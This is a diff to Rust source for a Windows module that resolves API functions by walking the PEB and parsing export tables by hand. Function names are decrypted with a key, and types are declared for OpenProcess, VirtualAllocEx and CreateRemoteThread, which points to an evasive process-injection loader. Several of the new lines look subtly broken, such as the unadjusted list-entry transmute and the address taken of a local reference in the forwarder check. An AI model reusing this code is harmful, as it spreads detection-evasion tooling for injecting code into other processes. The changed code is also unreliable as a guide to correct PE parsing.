@@ -5,7 +5,6 @@
 use crate::consts::*;
 use crate::crypto_util::*;
 #[cfg(test)]
-use crate::util::{print_buffer_as_string, print_buffer_as_string_utf16};
 use crate::windows::apiset::API_SET_NAMESPACE_V6;
 use crate::windows::ntdll::*;
 use std::arch::global_asm;
@@ -20,21 +19,21 @@ pub type LoadLibraryA = unsafe extern "system" fn(lpLibFileName: *const u8) -> u
 pub type GetLastError = unsafe extern "system" fn() -> u32;
 pub type GetProcAddress = unsafe extern "system" fn(hModule: usize, lpProcName: *const u8) -> usize;
 pub type FindResourceA =
-    unsafe extern "system" fn(hModule: usize, lpName: usize, lptype: usize) -> usize;
+unsafe extern "system" fn(hModule: usize, lpName: usize, lptype: usize) -> usize;
 pub type LoadResource = unsafe extern "system" fn(hModule: usize, hResInfo: usize) -> usize;
 pub type LockResource = unsafe extern "system" fn(hResData: usize) -> *const u8;
 pub type SizeofResource = unsafe extern "system" fn(hModule: usize, hResInfo: usize) -> u32;
 pub type CreateToolhelp32Snapshot =
-    unsafe extern "system" fn(dwFlags: u32, th32ProcessID: u32) -> usize;
+unsafe extern "system" fn(dwFlags: u32, th32ProcessID: u32) -> usize;
 pub type Process32First =
-    unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool;
+unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool;
 pub type Process32Next =
-    unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool;
+unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool;
 pub type CloseHandle = unsafe extern "system" fn(hObject: usize) -> bool;
 pub type OpenProcess =
-    unsafe extern "system" fn(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId: u32) -> usize;
+unsafe extern "system" fn(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId: u32) -> usize;
 pub type NtFlushInstructionCache =
-    unsafe extern "system" fn(hProcess: usize, lpBaseAddress: usize, dwSize: u32);
+unsafe extern "system" fn(hProcess: usize, lpBaseAddress: usize, dwSize: u32);
 pub type VirtualAllocEx = unsafe extern "system" fn(
     hProcess: usize,
     lpAddress: usize,
@@ -71,7 +70,7 @@ pub type CreateRemoteThread = unsafe extern "system" fn(
     lpThreadId: *mut u32,
 ) -> usize;
 pub type WaitForSingleObject =
-    unsafe extern "system" fn(hProcess: usize, dwMilliseconds: u32) -> u32;
+unsafe extern "system" fn(hProcess: usize, dwMilliseconds: u32) -> u32;
 
 pub type GetCurrentProcess = unsafe extern "system" fn() -> usize;
 
@@ -157,13 +156,13 @@ get_peb:
 #[cfg(all(windows, target_arch = "x86"))]
 global_asm!(
     r"
-.global get_peb
+.global _get_peb
 _get_peb:
     mov eax, fs:0x30
     ret",
 );
 
-pub unsafe fn GetModuleHandle(sModuleName: Vec<u8>) -> usize {
+pub unsafe fn GetModuleHandle(sModuleName: Vec<u8>, key: &[u8]) -> usize {
     let peb = get_peb();
 
     if sModuleName.is_empty() {
@@ -171,16 +170,16 @@ pub unsafe fn GetModuleHandle(sModuleName: Vec<u8>) -> usize {
     }
 
     let Ldr = peb.Ldr;
-    let pModuleList = addr_of!(Ldr.InMemoryOrderModuleList);
-    let pStartListEntry = (*pModuleList).Flink;
-    let sModuleNameW = String::from_utf8(sModuleName)
+    let pModuleList = &Ldr.InMemoryOrderModuleList;
+    let pStartListEntry = pModuleList.Flink;
+    let sModuleNameW = String::from_utf8(sModuleName.clone())
         .unwrap()
         .encode_utf16()
         .collect::<Vec<u16>>();
 
-    let mut pListEntry = pStartListEntry as *const LIST_ENTRY;
-    while pListEntry != pModuleList {
-        let pEntry = (pListEntry as usize - size_of::<LIST_ENTRY>()) as *const LDR_DATA_TABLE_ENTRY;
+    let mut pListEntry = pStartListEntry;
+    while addr_of!(*pListEntry) as usize != addr_of!(*pModuleList) as usize {
+        let pEntry: &'static TRUNC_LDR_DATA_TABLE_ENTRY = mem::transmute(pListEntry);
 
         // Debug code for printing out module names.
         // print_buffer_as_string_utf16(
@@ -196,8 +195,7 @@ pub unsafe fn GetModuleHandle(sModuleName: Vec<u8>) -> usize {
         {
             return (*pEntry).DllBase;
         }
-
-        pListEntry = (*pListEntry).Flink;
+        pListEntry = pListEntry.Flink;
     }
 
     0
@@ -205,38 +203,33 @@ pub unsafe fn GetModuleHandle(sModuleName: Vec<u8>) -> usize {
 
 pub unsafe fn GetProcAddress(hMod: usize, sProcName: &[u8]) -> usize {
     let pBaseAddr = hMod;
-    let pDosHdr = pBaseAddr as *const IMAGE_DOS_HEADER;
-    let pNTHdr = (pBaseAddr + (*pDosHdr).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
-    let pOptionalHdr = &(*pNTHdr).OptionalHeader;
+    let pDosHdr: &'static IMAGE_DOS_HEADER = mem::transmute(pBaseAddr);
+    let pNTHdr: &'static IMAGE_NT_HEADERS = mem::transmute(pBaseAddr + pDosHdr.e_lfanew as usize);
+    let pOptionalHdr = &pNTHdr.OptionalHeader;
     let pExportDataDir = &pOptionalHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-    let pExportDirAddr =
-        (pBaseAddr + pExportDataDir.VirtualAddress as usize) as *const IMAGE_EXPORT_DIRECTORY;
+    let pExportDirAddr: &'static IMAGE_EXPORT_DIRECTORY = mem::transmute(pBaseAddr + pExportDataDir.VirtualAddress as usize);
 
-    let pEAT = (pBaseAddr + (*pExportDirAddr).AddressOfFunctions as usize) as *const u32;
-    let pEATArray = std::slice::from_raw_parts(pEAT, (*pExportDirAddr).NumberOfFunctions as usize);
-
-    let pFuncNameTbl = (pBaseAddr + (*pExportDirAddr).AddressOfNames as usize) as *const u32;
-    let pHintsTbl = (pBaseAddr + (*pExportDirAddr).AddressOfNameOrdinals as usize) as *const u16;
+    let pEAT = pBaseAddr + pExportDirAddr.AddressOfFunctions as usize;
+    let sEATArray = std::slice::from_raw_parts(pEAT as *const u32, pExportDirAddr.NumberOfFunctions as usize);
 
     let mut pProcAddr = 0;
-
-    let sOrdinalTest = *(sProcName.as_ptr() as *const u32);
-    if sOrdinalTest >> 16 == 0 {
+    let dwOrdinalTest = *(sProcName.as_ptr() as *const u32);
+    if dwOrdinalTest >> 16 == 0 {
         let ordinal = (*(sProcName.as_ptr() as *const u16)) as u32;
-        let Base = (*pExportDirAddr).Base;
+        let Base = pExportDirAddr.Base;
 
-        if (ordinal < Base) || (ordinal >= Base + (*pExportDirAddr).NumberOfFunctions) {
+        if (ordinal < Base) || (ordinal >= Base + pExportDirAddr.NumberOfFunctions) {
             return 0;
         }
 
-        pProcAddr = pBaseAddr + pEATArray[(ordinal - Base) as usize] as usize;
+        pProcAddr = pBaseAddr + sEATArray[(ordinal - Base) as usize] as usize;
     } else {
-        let pFuncNameTblArray =
-            std::slice::from_raw_parts(pFuncNameTbl, (*pExportDirAddr).NumberOfNames as usize);
+        let pFuncNameTbl = pBaseAddr + pExportDirAddr.AddressOfNames as usize;
+        let sFuncNameTblArray =
+            std::slice::from_raw_parts(pFuncNameTbl as *const u32, pExportDirAddr.NumberOfNames as usize);
 
-        for i in 0..(*pExportDirAddr).NumberOfNames as usize {
-            let string_ptr = pBaseAddr + pFuncNameTblArray[i] as usize;
-
+        for i in 0..pExportDirAddr.NumberOfNames as usize {
+            let string_ptr = pBaseAddr + sFuncNameTblArray[i] as usize;
             let c_string = CStr::from_ptr(string_ptr as *const c_char);
             // Debug code for printing out module names.
             // if cfg!(test) {
@@ -244,15 +237,16 @@ pub unsafe fn GetProcAddress(hMod: usize, sProcName: &[u8]) -> usize {
             // }
 
             if sProcName == c_string.to_bytes() {
-                let pHintsTblArray =
-                    std::slice::from_raw_parts(pHintsTbl, (*pExportDirAddr).NumberOfNames as usize);
-                pProcAddr = pBaseAddr + pEATArray[pHintsTblArray[i] as usize] as usize;
+                let pHintsTbl = pBaseAddr + pExportDirAddr.AddressOfNameOrdinals as usize;
+                let sHintsTblArray =
+                    std::slice::from_raw_parts(pHintsTbl as *const u16, pExportDirAddr.NumberOfNames as usize);
+                pProcAddr = pBaseAddr + sEATArray[sHintsTblArray[i] as usize] as usize;
             }
         }
     }
 
-    if pProcAddr >= pExportDirAddr as usize
-        && pProcAddr < pExportDirAddr as usize + (*pExportDataDir).Size as usize
+    if pProcAddr >= addr_of!(pExportDirAddr) as usize
+        && pProcAddr < addr_of!(pExportDirAddr) as usize + pExportDataDir.Size as usize
     {
         let mut sFwdDll = match CStr::from_ptr(pProcAddr as *const c_char).to_str() {
             Ok(s) => s.to_string(),
@@ -326,7 +320,7 @@ pub unsafe fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> usiz
             CREATETOOLHELP32SNAPSHOT_POS,
             CREATETOOLHELP32SNAPSHOT_LEN,
         )
-        .as_slice(),
+            .as_slice(),
     ));
 
     createToolhelp32Snapshot(dwFlags, th32ProcessID)
